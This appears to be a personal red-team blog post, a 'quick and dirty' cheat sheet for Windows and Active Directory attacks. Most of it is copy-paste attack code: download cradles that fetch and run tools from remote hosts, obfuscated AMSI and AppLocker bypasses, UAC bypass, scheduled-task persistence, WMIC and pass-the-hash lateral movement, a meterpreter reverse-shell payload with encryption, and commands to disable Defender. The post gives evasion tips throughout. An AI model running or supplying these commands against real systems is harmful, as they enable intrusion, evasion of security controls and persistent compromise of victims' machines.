---
title: "Offensive Notes" 
layout: "post"
---

This blog post has been updated based on some tools and techniques from Offensive Security’s PEN-300 course as well ad the CRTO course from Rastamouse. 
It should be useful in a lot of cases when dealing with Windows / AD exploitation. This is my quick and dirty cheat sheet. 


## Enumeration

# 0) PowerShell one-liners

.NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.

### Load PowerShell script reflectively
Proxy-aware:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```
Non-proxy aware:
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```
__Note:__ Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)



### Load C# assembly reflectively

Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, [check this out](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Load DLL assembly reflectively 

The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:

```powershell
PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```


We could also encode the DLL to a base64 string and load it without it needing to be on disk: 🚩

```powershell
PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > $dllstring = [System.Convert]::ToBase64String($dll)
PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

Or download the DLL from a remote location:

```powershell
PS > $dll = (new-object net.webclient).DownloadData("http://10.8.0.6/ReflectionDemo.dll")
PS > [System.Reflection.Assembly]::Load($dll)
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

You can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:

```powershell
PS > $monk = (new-object net.webclient).downloaddata("http://192.168.152.100/monk.exe")
PS > [System.Reflection.Assembly]::Load($monk)

GAC Version Location
--- ------- --------
False v4.0.30319

PS > [MonkStager.MonkStager]::Execute()
```

__Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩



### 1) Powershell AMSI Bypass

Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Obfuscation example for copy-paste purposes:

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another method could be to compile the C# bypass to a .NET DLL and use PowerShell to load it reflectively.

```powershell
PS C:\> $bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
PS C:\> [System.Reflection.Assembly]::Load($bytes)
GAC Version Location
--- ------- -------
False v4.0.30319
PS C:\> [Amsi]::Bypass()
PS C:\> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program.
```

```powershell
# Base 64 AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)


$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


### 2) Powershell Oneliner

### 3) Applocker 

Fortunately for us, there is a powershell module named AppLocker, which can query the AppLocker rules that are enforced on the current system. 
Below is a simple powershell script that outputs the rules in a readable format so you can use this information to bypass them.

```powershell

Import-Module AppLocker
[xml]$data = Get-AppLockerPolicy -effective -xml

# Extracts All Rules and print them.
Write-Output "[+] Printing Applocker Rules [+]`n"
($data.AppLockerPolicy.RuleCollection | ? { $_.EnforcementMode -match "Enabled" }) | ForEach-Object -Process {
Write-Output ($_.FilePathRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Path Rule ===`n`n Rule Name : $($_.Name) `n Condition : $($_.Conditions.FilePathCondition.Path)`n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
Write-Output ($_.FileHashRule) | ForEach-Object -Process { Write-Output "=== File Hash Rule ===`n`n Rule Name : $($_.Name) `n File Name :  $($_.Conditions.FileHashCondition.FileHash.SourceFileName) `n Hash type : $($_.Conditions.FileHashCondition.FileHash.Type) `n Hash :  $($_.Conditions.FileHashCondition.FileHash.Data) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
Write-Output ($_.FilePublisherRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Publisher Rule ===`n`n Rule Name : $($_.Name) `n PublisherName : $($_.Conditions.FilePublisherCondition.PublisherName) `n ProductName : $($_.Conditions.FilePublisherCondition.ProductName) `n BinaryName : $($_.Conditions.FilePublisherCondition.BinaryName) `n BinaryVersion Min. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection) `n BinaryVersion Max. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
}

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections	
Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4" /s

```
The script will try to find all the AppLocker rules that don’t have the Default Rule in their name and then output the FilePath,FilePublisher and FileHash rules.

### 4) Powershell CLM & LAPS

#### PowerShell Constrained Language Mode
Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker.
You can identify you’re in constrained language mode by polling the following variable to get the current language mode. It will say FullLanguage for an unrestricted session, and ConstrainedLanguage for CLM. 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. whoami is blocked, try the following:

```powershell
&{whoami}
```

#### LAPS 
We can use `LAPSToolkit.ps1` to identify which machines in the domain use LAPS, and which domain groups are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.

```powershell
#Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers
#Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
```


# PrivEsc

#### 1) PowerUp

```py
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
```

If you want to invoke everything without touching disk, use something like this:

```py
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```


#### 2) UAC Bypasses

Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 

```cpp
SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"

BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
```


# Persistence

##### 1) Classic Startup folder

Just drop a binary in current user folder, will trigger when current user signs in:

```py
"C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```
Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot and when any user signs on:

```py
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

##### 2) Schedule Tasks

This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.

```powershell
function New-ScheduledTaskPersistence {

    $name = "Persistence"
  
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At 11am `
        -RepetitionInterval (New-TimeSpan -Hours 4) `
        -RepetitionDuration (New-TimeSpan -Days 30)
  
      $action = New-ScheduledTaskAction `
        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
        -WorkingDirectory "C:\Windows\System32"
  
      Register-ScheduledTask `
        -TaskName $name `
        -Trigger $trigger `
        -Action $action `
        -Force
}
```
To execute this PowerShell script on the target, go to the Interact CLI, import and execute the powershell module 


```cpp
schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
```

##### 3) COM Hijacks

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).

Process Monitor is part of the excellent Sysinternals Suite from Microsoft. It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives. Launch procmon64.exe on attacker-windows.

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/procmon.JPG">
</p>

Another great place to look for hijackable COM components is in the Task Scheduler.  Rather than executing binaries on disk, many of the default Windows Tasks actually use Custom Triggers to call COM objects.  
And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered.

This simple powershell script can be used to achieve this operation. 

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            if ($Task.Principal.GroupId -eq "Users")
            {
                Write-Host "Task Name: " $Task.TaskName
                Write-Host "Task Path: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}
```

# Lateral Movement

##### WMIC Lateral Movement

```cpp
wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
```

# MSSQL databases

PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.

```py
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance 'sql-1.cyber.io,1433'

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

#PowerUpSQL automatically crawl database links
Get-SQLServerLinkCrawl -Instance 'sql-1.cyber.io,1433'

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance sql-1.cyber.io

# Run command (requires XP_CMDSHELL to be enabled)
Invoke-SQLOSCmd -Instance sql-1.cyber.io -Command "whoami" |  select -ExpandProperty CommandResults
Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
```

# Domain Dominance

# Misc & Encoding

##### PeZOR Packing and Encoding 

```cpp
PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
```

##### Cat to base64 

```cpp
cat file.ps1 | iconv -t utf-16le | base64 -w 0
powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
```

##### Powershell to base64

```cpp
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))

$filename = "C:\Users\&&&&&\Desktop\exclusion\showPidx64.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
``` 

##### Hex Encode 

```py
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
xxd -i encmeter.bin
```

##### Default MSF bin

```py
msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
```

##### PS memory 

```powershell
$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
echo $encodedcommand
```

##### Impacket
Impacket is a collection of Python classes for working with network protocols
```py
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
```


#### Disable Defender 

```powershell
Shell comand to disable Defender 

shell Set-MpPreference -DisableRealtimeMonitoring $true 
shell Set-MpPreference -EnableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True
```

